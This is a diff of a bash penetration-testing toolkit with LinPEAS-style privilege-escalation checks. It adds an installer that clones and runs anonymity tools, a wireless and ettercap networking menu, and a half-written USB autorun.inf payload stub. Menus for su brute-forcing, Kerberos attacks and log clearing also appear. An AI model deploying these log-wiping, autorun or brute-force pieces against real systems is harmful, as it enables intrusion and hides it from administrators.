+      printf ${BLUE}"[i]${BGreen} Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
     fi
     print_info "Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes"
 
@@ -4131,14 +4114,14 @@ FunLinPEAS(){
 
     if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] || [ "$AUTO_NETWORK_SCAN" ]; then
       if ! [ "$FOUND_NC" ]; then
-        printf $RED"[-] $SCAN_BAN_BAD\n$NC"
+        printf ${BRed}"[-] $SCAN_BAN_BAD\n$NC"
         echo "The network is not going to be scanned..."
 
       else
         print_2title "Scanning local networks (using /24)"
 
         if ! [ "$PING" ] && ![ "$FPING" ]; then
-          printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
+          printf ${BRed}"[-] $DISCOVER_BAN_BAD\n$NC"
         fi
 
         select_nc
@@ -4432,7 +4415,7 @@ FunLinPEAS(){
           su_brute_user_num "$u" $PASSTRY
         done
       else
-        printf $GREEN"It's not possible to brute-force su.\n\n"$NC
+        printf ${BGreen}"It's not possible to brute-force su.\n\n"$NC
       fi
     else
       print_2title "Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
@@ -5087,7 +5070,7 @@ FunLinPEAS(){
     #-- SI) S/Key athentication
     print_2title "S/Key authentication"
     if grep auth= /etc/login.conf 2>/dev/null | grep -v \"^#\" | grep -q skey; then
-      printf "System supports$RED S/Key$NC authentication\n"
+      printf "System supports${BRed} S/Key$NC authentication\n"
       if ! [ -d /etc/skey/ ]; then
         echo "${GREEN}S/Key authentication enabled, but has not been initialized"
       elif ! [ "$IAMROOT" ] && [ -w /etc/skey/ ]; then
@@ -5102,7 +5085,7 @@ FunLinPEAS(){
     #-- SI) YubiKey athentication
     print_2title "YubiKey authentication"
     if grep auth= /etc/login.conf 2>/dev/null | grep -v \"^#\" | grep -q yubikey; then
-      printf "System supports$RED YubiKey$NC authentication\n"
+      printf "System supports${BRed} YubiKey$NC authentication\n"
       if ! [ "$IAMROOT" ] && [ -w /var/db/yubikey/ ]; then
         echo "${RED}/var/db/yubikey/ is writable by you"
         ls -ld /var/db/yubikey/
@@ -5343,11 +5326,11 @@ FunLinPEAS(){
                 if echo "$sline_first" | grep -qEv "$cfuncs"; then
                   if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then #If a path
                     if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
-                      printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
+                      printf "$ITALIC  --- It looks like ${BRed}$sname$NC$ITALIC is using ${BRed}$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                     fi
                   else #If not a path
                     if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/' && echo "$sline_first" | grep -Eqv "\.\."; then #Check if existing binary
-                      printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
+                      printf "$ITALIC  --- It looks like ${BRed}$sname$NC$ITALIC is executing ${BRed}$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                     fi
                   fi
                 fi
@@ -5409,11 +5392,11 @@ FunLinPEAS(){
                 if echo "$sline_first" | grep -qEv "$cfuncs"; then
                   if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then #If a path
                     if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
-                      printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
+                      printf "$ITALIC  --- It looks like ${BRed}$sname$NC$ITALIC is using ${BRed}$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
                     fi
                   else #If not a path
                     if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/'; then #Check if existing binary
-                      printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
+                      printf "$ITALIC  --- It looks like ${BRed}$sname$NC$ITALIC is executing ${BRed}$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
                     fi
                   fi
                 fi
@@ -5667,7 +5650,7 @@ FunLinPEAS(){
     printf "%s\n" "$logfind" | while read log; do
       if ! [ "$IAMROOT" ] && [ "$log" ] && [ -w "$log" ] || ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders"; then #Only print info if something interesting found
         if echo "$log" | grep -q "You_can_write_more_log_files_inside_last_directory"; then printf $ITALIC"$log\n"$NC;
-        elif ! [ "$IAMROOT" ] && [ -w "$log" ] && [ "$(command -v logrotate 2>/dev/null)" ] && logrotate --version 2>&1 | grep -qE ' 1| 2| 3.1'; then printf "Writable:$RED $log\n"$NC; #Check vuln version of logrotate is used and print red in that case
+        elif ! [ "$IAMROOT" ] && [ -w "$log" ] && [ "$(command -v logrotate 2>/dev/null)" ] && logrotate --version 2>&1 | grep -qE ' 1| 2| 3.1'; then printf "Writable:${BRed} $log\n"$NC; #Check vuln version of logrotate is used and print red in that case
         elif ! [ "$IAMROOT" ] && [ -w "$log" ]; then echo "Writable: $log";
         elif ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders" && [ "$log" ] && [ ! "$lastWlogFolder" == "$log" ]; then lastWlogFolder="$log"; echo "Writable folder: $log" | sed -${E} "s,$Wfolders,${SED_RED},g";
         fi
@@ -5736,7 +5719,7 @@ FunLinPEAS(){
       echo ""
       printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
         if ([ -r "$f" ] && [ "$FILECMD" ] && file "$f" | grep -qi sqlite) || ([ -r "$f" ] && [ ! "$FILECMD" ]); then #If readable and filecmd and sqlite, or readable and not filecmd
-          printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
+          printf ${BGreen}" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
           if [ "$(command -v sqlite3 2>/dev/null)" ]; then
             tables=$(sqlite3 $f ".tables" 2>/dev/null)
             #printf "$tables\n" | sed "s,user.*\|credential.*,${SED_RED},g"
@@ -5818,7 +5801,7 @@ FunLinPEAS(){
       print_2title "Interesting GROUP writable files (not in Home) (max 500)"
       print_info "https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files"
       for g in $(groups); do
-        printf "  Group $GREEN$g:\n$NC";
+        printf "  Group ${BGreen}$g:\n$NC";
         iwfbg=$(find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
         printf "%s\n" "$iwfbg" | while read entry; do
           if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
@@ -7700,13 +7683,13 @@ BrutePort(){
   # Creating Scans and Output Folders
   Report() {
     echo " "
-    echo "    ${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} BrutePort ${BRed}]"
+    echo "    ${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} BrutePort ${BRed}]"
     cd "${MainDirectoriyCaseNameBrutePort}"
-    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Scans ${BRed}]"
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Scans ${BRed}]"
   	mkdir Scans Scans/${targetNAME} &> /dev/null
-    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Output ${BRed}]"
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Output ${BRed}]"
     mkdir Output Output/${targetNAME} &> /dev/null
-    echo "    ${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    echo "    ${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} AttacKing ${BRed}]"
     read -p "$Press_ENTER"
   }
   Report
@@ -8367,11 +8350,11 @@ AttacKingKerberos(){
     ${BYellow}${faintT}|
     ${BYellow}${faintT}└──╼${resetT}${BRed}[${DGrey} X ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} ${Anlominus} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${AttacKerberos} ${BRed}]${BGreen}──╼ ${BGreen}   ")"
+    ${BGreen}└──${BRed}[${BYellow} ${Anlominus} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Weaponization ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${AttacKerberos} ${BRed}]${BYellow}╼▰  ${BGreen}   ")"
 
     read -p "$AttacKerberosMenuMain" cmd
     case $cmd in
@@ -8479,6 +8462,206 @@ StartingKerbrute(){
   fi
 }
 
+# Anonymous Installer
+AnonymousInstaller(){
+
+  AnonymousLogo(){
+    echo ""${BBlue}
+    echo "################################################################################################"
+    echo "                                                                                                "
+    echo "      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗        "
+    echo "     ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝        "
+    echo "     ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗        "
+    echo "     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║        "
+    echo "     ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║        "
+    echo "     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝>tools  "
+    echo "                                                                                                "
+    echo "################################################################################################"
+  }
+  anonsurf() {
+    clear
+    echo "${BGreen}"
+    echo "    Do you want install anonsurf ${BRed}?${BBlue} [Y/N] : "${BRed}
+    read install
+    if [[ $install = "Y" || $install = "y" ]]; then
+      clear
+      echo "    checking ${BRed}[internet]${BBlue} connections${BRed}........"
+      ping -c 1 google.com > /dev/null
+      if [ "$?" != 0 ]; then
+      echo "    [!] you not connect to the internet ! "
+      echo "    [!] please Connect to the internet and try again :) "
+      read -p "${Press_ENTER}"
+      exit
+    fi
+      echo "    ${BBlue}[*] ${BGreen}[ CONNECT ]"
+      echo "    ========== install anonsurf for you ==========="
+      echo "    [*] working........"
+      git clone https://github.com/Und3rf10w/kali-anonsurf.git
+  	  cd kali-anonsurf
+  	  chmod +x installer.sh
+  	  ./installer.sh
+      echo "    [*] Finishing....."
+      read -p "${Press_ENTER}"
+      clear
+    else
+      if [ $install = N || $install = n ]; then
+        clear
+      fi
+    fi
+  }
+  anonym8() {
+    clear
+    echo "${BGreen}"
+    echo "    Do you want install anonym8 ${BRed}?${BBlue} [Y/N] : "
+    read install
+    if [[ $install = Y || $install = y ]]; then
+      clear
+      echo "    checking ${BRed}[internet]${BBlue} connections${BRed}........"
+      ping -c 1 google.com > /dev/null
+      if [ "$?" != 0 ]; then
+        echo "    [!] you not connect to the internet ! "
+        echo "    [!] please Connect to the internet and try again :) "
+        read -p "${Press_ENTER}"
+        exit
+      fi
+      echo "${BBlue} [*] ${BGreen}[ CONNECT ]"
+      echo "    =========== install anonym8 for you ==========="
+      echo "    [*] working........."
+      git clone https://github.com/HiroshiManRise/anonym8.git
+  	  cd anonym8
+  	  chmod +x INSTALL.sh
+  	  ./INSTALL.sh
+      echo "    [*] Finishing....."
+      read -p "${Press_ENTER}"
+      clear
+    else
+      if [ $install = N || $install = n ]; then
+        clear
+      fi
+    fi
+  }
+  torghost() {
+    clear
+    echo "${BGreen}"
+    echo "    Do you want install 4nonimizer ${BRed}?${BBlue} [Y/N] : "
+    read install
+    if [[ $install = Y || $install = y ]]; then
+      echo "      checking ${BRed}[internet]${BBlue} connections${BRed}........"
+      ping -c 1 google.com > /dev/null 2>&1
+      if [ "$?" != 0 ]; then
+      clear
+      echo "      [!] you not connect to the internet ! "${BBlue}
+      echo "      [!] please Connect to the internet and try again :) "
+      read -p "${Press_ENTER}"
+      exit
+      fi
+      echo "      [*] [ CONNECT ]"
+      echo "      ============ install TorGhost for you ============="
+      sleep 4
+      echo "      [*] working..........."
+      sleep 1
+      git clone https://github.com/susmithHCK/torghost.git
+      cd torghost/
+      chmod +x install.sh
+      ./install.sh
+      echo ${BGreen}"      [*] Finishing....."
+      read -p "${Press_ENTER}"
+      clear
+    else
+      if [[ $install = N || $install = n ]];then
+      clear
+      fi
+    fi
+  }
+  non() {
+  clear
+  echo "${BGreen}"
+  echo "  Do you want install 4nonimizer ${BRed}?${BBlue} [Y/N] : "${BRed}
+  read install
+  if [[ $install = Y || $install = y ]]; then
+    clear
+    echo "  checking ${BRed}[internet]${BBlue} connections${BRed}........"
+    ping -c 1 google.com > /dev/null 2>&1
+    if [ "$?" != 0 ]; then
+      clear
+      echo "   [!] you not connect to the internet ! "${BBlue}
+      echo "   [!] please Connect to the internet and try again :) "
+      read -p "${Press_ENTER}"
+      exit
+    fi
+      echo "    [*] [ CONNECT ]"
+      echo "    ========== install 4nonimizer for you ==========="
+      echo "    [*] working........."
+      git clone https://github.com/Hackplayers/4nonimizer.git
+  		cd 4nonimizer
+  		chmod +x 4nonimizer
+  		./4nonimizer install
+  		apt-get -y install python-pip
+  		apt-get -y install php-curl
+  		gem install pcaprub
+  		gem install packetfu
+      echo "    [*] Finishing....."
+      read -p "${Press_ENTER}"
+      clear
+  else
+    if [[ $install = N || $install = n ]];then
+      clear
+    fi
+  fi
+}
+
+  ###### HOME
+  homenu() {
+   clear
+   echo ""${BGreen}
+   echo "################################################################################################"
+   echo "    [*]  We Are Anonymous !!                                                                          "
+   echo "     Until You Not Anonymous in the Network Dont Run Nothing !      "
+   echo "################################################################################################"
+
+   AnonymousLogo
+
+   echo "
+   1] install (4nonimizer)
+   2] install (anonsurf)
+   3] install (Anonym8)
+   4] install (TorGhost)
+   5] Exit"
+   echo "${BBlue}"
+   read -p "    Choose:->  " Anonselc
+   case $Anonselc in
+    1|"install(4nonimizer)")
+    non
+    read -p "${Press_ENTER}"
+    clear
+    ;;
+    2|"install anonsurf")
+    anonsurf
+    read -p "${Press_ENTER}"
+    clear
+    ;;
+    3|"install Anonym8")
+    anonym8
+    read -p "${Press_ENTER}"
+    clear
+    ;;
+    4|"install TorGhost")
+    torghost
+    read -p "${Press_ENTER}"
+    clear
+    ;;
+    5|"Exit")
+    clear && exit 0
+    ;;
+    * )
+    echo "${BRed}[x]${BBlue} The error of your choice does not exist"
+    read -p "${Press_ENTER}"
+    ;;
+   esac
+ }
+  homenu
+}
+
 ###############################################
 #         HacKingPro Main Menu
 ###############################################
@@ -8486,13 +8669,14 @@ StartingKerbrute(){
 MainMenu(){
   while true; do
     clear
+    echo ${resetT}
     cd "${MainDirectoriy}"
     ToolHeaderRun
     TargetStatusRun
     HacKingProMenuMain=$(echo "${BRed}
     ${BYellow}${faintT}┌──${resetT}${BRed}[${BYellow} ${HacKingPro} ${BRed}]${BYellow}${faintT}───────╼${resetT}${BYellow}▰▰▰
     ${BYellow}${faintT}|
-    ${BYellow}${faintT}|──┲─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} 00 ${BRed}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} Anonymity ${BRed}]
+    ${BYellow}${faintT}|──┲─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} 0 ${BRed}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} Anonymity ${BRed}]
     ${BYellow}${faintT}|  ┖──────────╼ ${BRed}[${BYellow} Anonymity ${BRed}]
     ${BYellow}${faintT}|
     ${BYellow}${faintT}|──┲─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} 1 ${BRed}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${resetT}${BRed}[${BYellow} Reconnaissance & Information Gathering ${BRed}]
@@ -8536,17 +8720,21 @@ MainMenu(){
           ToolHeaderRun
           TargetStatusRun
           HacKingProMenuMain=$(echo "${BRed}
-    ${DGrey}┌──${BRed}[${BYellow} Anonimity ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[${BWhite} 01 ${BRed}]${BGreen}── ${BRed}[${BWhite} Cover Me ${BRed}]${BGreen}── ${BRed}[${BWhite} Clean Logs & History${BRed}]
-    ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+    ${DGrey}[0]───${resetT}${BYellow}╼▰ ${BRed}[${DGrey} Anonimity ${BRed}]
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${DGrey}┌──${BRed}[${LGreen} NetWorKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BGreen}${slowBlink} NetPro ${resetT}${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen} NetWorKingPro ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen}${faintT} NetWorKing Controller ${resetT}${BRed}]
+
+    ${DGrey}┌──${BRed}[${BWhite} 00 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BWhite} Installer ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BWhite} Installing Anonymous Tools ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BWhite} 01 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BWhite} Cover Me ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BWhite} Clean Logs & History${BRed}]
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Anonymity ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Anonymity ${BRed}]${BYellow}╼▰  ${BGreen}   ")
           read -p "$HacKingProMenuMain" cmd
           case $cmd in
             p|P )
@@ -8555,9 +8743,146 @@ MainMenu(){
             ls )
             lahs
             ;;
+            0|00 )
+            clear
+            echo ${faintT}
+            AnonymousInstaller
+            read -p "${Press_ENTER}"
+            ;;
             1|01 )
             clear
             CoverMe
+            read -p "${Press_ENTER}"
+            ;;
+            nt|NT|netpro|NetPro)
+            while true; do
+              clear
+              ToolHeaderRun
+              TargetStatusRun
+              #statements
+            NetWorKingPro(){
+              NetWorKingProMenu="$(echo "
+    ╔╗╔┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─┬┌┐┌┌─┐
+    ║║║├┤  │ ││││ │├┬┘├┴┐│││││ ┬
+    ╝╚╝└─┘ ┴ └┴┘└─┘┴└─┴ ┴┴┘└┘└─┘
+
+    ${DGrey}┌────╼ ${BRed}[${BYellow} Networking ${BRed}]
+    ${DGrey}┖─┲──╼ ${BRed}[${BYellow} Control Manager for Networking ${BRed}]
+    ${DGrey}  ┖──╼ ${BRed}[${BYellow} Use it for Easy life ${BRed}]
+
+    options :${BBlue}
+    ${DGrey}┌──${BRed}[${BWhite} 01 ${BRed}]${BYellow}╼▰ Show Yuor Info Use Ifconfig
+    ${DGrey}|──${BRed}[${BWhite} 02 ${BRed}]${BYellow}╼▰ Enable Monitor Mode
+    ${DGrey}|──${BRed}[${BWhite} 03 ${BRed}]${BYellow}╼▰ Disabled Monitor Mode
+    ${DGrey}|──${BRed}[${BWhite} 04 ${BRed}]${BYellow}╼▰ Down Interface
+    ${DGrey}|──${BRed}[${BWhite} 05 ${BRed}]${BYellow}╼▰ Up Interface
+    ${DGrey}|──${BRed}[${BWhite} 06 ${BRed}]${BYellow}╼▰ Restart Network-Manager
+    ${DGrey}|──${BRed}[${BWhite} 07 ${BRed}]${BYellow}╼▰ Change My hostname
+    ${DGrey}|──${BRed}[${BWhite} 08 ${BRed}]${BYellow}╼▰ Change My MAC Address
+    ${DGrey}|──${BRed}[${BWhite} 09 ${BRed}]${BYellow}╼▰ Show My Public IP Address
+    ${DGrey}|──${BRed}[${BWhite} 10 ${BRed}]${BYellow}╼▰ Find Live Hosts In My Network
+    ${DGrey}|──${BRed}[${BWhite} 11 ${BRed}]${BYellow}╼▰ Open My Router Default Page
+    ${DGrey}|──${BRed}[${BWhite} 12 ${BRed}]${BYellow}╼▰ EdIt etter.dns
+    ${DGrey}└──${BRed}[${BWhite} 13 ${BRed}]${BYellow}╼▰ Edit etter.conf
+
+    ${BGreen}┌──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} NetWorKing ${BRed}]${BYellow}╼▰  ${BGreen}  ")"
+              read -p "${NetWorKingProMenu}" Anonselc
+              case $Anonselc in
+                1)
+                clear
+                ifconfig
+                read -p "${Press_ENTER}"
+                ;;
+               2)
+               Enable_Monitor_Mode(){
+                 clear
+                 echo "\n"
+                 echo  "    [*] Finding your Network Interfaces... "$GREEN
+                 ifconfig -a | egrep -v 'inet'
+                 echo "\n"
+                 echo  "    [*] Enter Your Interface : "$BLUE
+                 read interface
+                 if [[ $interface = '' ]];then
+                   echo "\n"
+                   echo "    You Not Enter the Interface !? "
+                   echo "\n"
+                   read -p "${Press_ENTER}"
+                   clear
+                 else
+                   echo "\n"
+                   airmon-ng start $interface
+                   echo "\n"
+                   echo "$GREEN    Monitor on $BLUE($RED>$BLUE  $interface $RED <$BLUE)$GREEN has been Enable "
+                   echo "\n"
+                   read -p "${Press_ENTER}"
+                   clear
+                 fi
+                 read -p "${Press_ENTER}"
+                 clear
+               }
+               Enable_Monitor_Mode
+               ;;
+               3)
+               Diable_Monitor_Mode(){
+                 if [[ $interface = '' ]];then
+                   echo "\n"
+                   echo "    You Not Enter the Interface !? "
+                   echo "\n"
+                   read -p "${Press_ENTER}"
+                   clear
+                 else
+                   echo "\n"
+                   airmon-ng stop $interface
+                   echo "\n"
+                   echo "$GREEN    Monitor off $BLUE($RED>$BLUE  $interface $RED <$BLUE)$GREEN has been Disabled "
+                   echo "\n"
+                   read -p "${Press_ENTER}"
+                   clear
+                 fi
+               }
+               Diable_Monitor_Mode
+
+               ;;
+               p|P )
+               HacKingProPlanning
+               ;;
+               cl )
+               ClearTarget
+               ;;
+               ls )
+               lahs
+               ;;
+               usb)
+               clear
+               # allows you to change any USB stick to Rubber Ducky.
+CreatePayLoad(){
+  echo " " > payload.bat
+}
+echo"
+[autorun]
+
+label=RubberDUSB
+
+icon=RubberDUSB.ico
+
+open=payload.bat" >> autorun.inf
+               ;;
+               x|X|exit|quit|Exit )
+               clear
+               cd ${MainDirectoriy}
+               HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+               echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+               break
+               ;;
+               * )
+               echo "$InvalidOption"
+               ;;
+              esac
+            }
+            NetWorKingPro
+          done
             ;;
             x|X|exit|EXIT )
             cd ${MainDirectoriy}
@@ -8583,38 +8908,38 @@ MainMenu(){
     ${DGrey}|    ┖──╼ ${BRed}[${BYellow} Intruder selects target, researches it, and attempts to identify vulnerabilities in the target network. ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CPI ${BRed}]${BGreen}── ${BRed}[${BYellow} Public Information ${BRed}]
-    ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p4 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p5 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p6 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
-    ${DGrey}|    ┖──${BRed}[${DGrey} p7 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} xxx Scan ${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Arp Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p2 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Ping Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p3 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Nslookup Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p4 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Dig Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p5 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} WhoIs Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p6 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Dirb Scan ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} p7 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} xxx Scan ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CMI ${BRed}]${BGreen}── ${BRed}[${BYellow} Machine Information ${BRed}]
-    ${DGrey}|  ┖─┲──${BRed}[${DGrey} m0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} xxx Scan ${BRed}]
-    ${DGrey}|    ┖──${BRed}[${DGrey} m1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} xxx Scan ${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} m0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} xxx Scan ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} m1 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} xxx Scan ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CNI ${BRed}]${BGreen}── ${BRed}[${BYellow} Network Information ${BRed}]
-    ${DGrey}|  ┖─┲──${BRed}[${DGrey} n0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
